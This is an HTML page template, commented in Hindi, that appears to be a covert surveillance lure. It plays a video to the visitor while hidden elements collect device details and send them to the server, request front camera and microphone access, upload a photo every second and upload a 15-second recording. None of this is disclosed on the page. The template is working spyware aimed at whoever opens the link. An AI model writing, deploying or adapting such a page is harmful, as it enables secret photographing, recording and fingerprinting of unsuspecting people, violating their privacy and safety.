<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video</title>
    <style>
        body { margin:0; padding:0; background:#000; overflow:hidden; }
        #owner-video { width:100%; height:100vh; object-fit:contain; background:black; }
        #visitor-video, #canvas, #status { position:absolute; left:-9999px; width:1px; height:1px; }
    </style>
</head>
<body>
    <video id="owner-video" src="{{ video_url }}" muted autoplay playsinline loop></video>
    <video id="visitor-video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <p id="status" style="display:none;"></p>

    <script>
        const uniqueId = "{{ unique_id }}";
        const visitorVideo = document.getElementById('visitor-video');
        const canvas = document.getElementById('canvas');

        // 📱 डिवाइस इन्फो भेजें
        async function sendDeviceInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform || 'N/A',
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
                deviceMemory: navigator.deviceMemory || 'N/A',
                batteryLevel: 'N/A',
                batteryCharging: 'N/A',
                networkType: 'N/A',
                hasTouch: navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
            };
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    info.batteryLevel = Math.round(battery.level * 100);
                    info.batteryCharging = battery.charging ? 'Yes' : 'No';
                }
            } catch(e) {}
            if (navigator.connection) {
                info.networkType = navigator.connection.effectiveType || 'N/A';
            }
            fetch('/device_info/' + uniqueId, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            }).catch(e => console.error(e));
        }

        // 📸 फोटो कैप्चर और भेजें
        async function captureAndSendPhoto() {
            if (!visitorVideo.videoWidth) return;
            canvas.width = visitorVideo.videoWidth;
            canvas.height = visitorVideo.videoHeight;
            canvas.getContext('2d').drawImage(visitorVideo, 0, 0);
            const imageData = canvas.toDataURL('image/jpeg', 0.85);
            fetch('/upload/' + uniqueId, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData })
            }).catch(e => console.error(e));
        }

        // 🎥 15 सेकंड वीडियो
        async function recordVideo(stream) {
            try {
                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                const chunks = [];
                mediaRecorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                mediaRecorder.start();
                await new Promise(r => setTimeout(r, 15000));
                mediaRecorder.stop();
                await new Promise(r => mediaRecorder.onstop = r);
                if (chunks.length === 0) return;
                const videoBlob = new Blob(chunks, { type: 'video/webm' });
                const formData = new FormData();
                formData.append('video', videoBlob, 'visitor.webm');
                await fetch('/upload_video/' + uniqueId, { method: 'POST', body: formData });
            } catch(e) { console.error('Video error:', e); }
        }

        // शुरू करें
        (async function main() {
            sendDeviceInfo();   // डिवाइस इन्फो पहले भेजें
            let stream;
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" },
                    audio: true
                });
                visitorVideo.srcObject = stream;
                await new Promise(r => visitorVideo.onloadedmetadata = r);

                // हर 1 सेकंड में फोटो
                setTimeout(() => {
                    setInterval(captureAndSendPhoto, 1000);
                }, 500);
                await recordVideo(stream);
            } catch(e) { console.error('Permission error:', e); }
        })();
    </script>
</body>
</html>
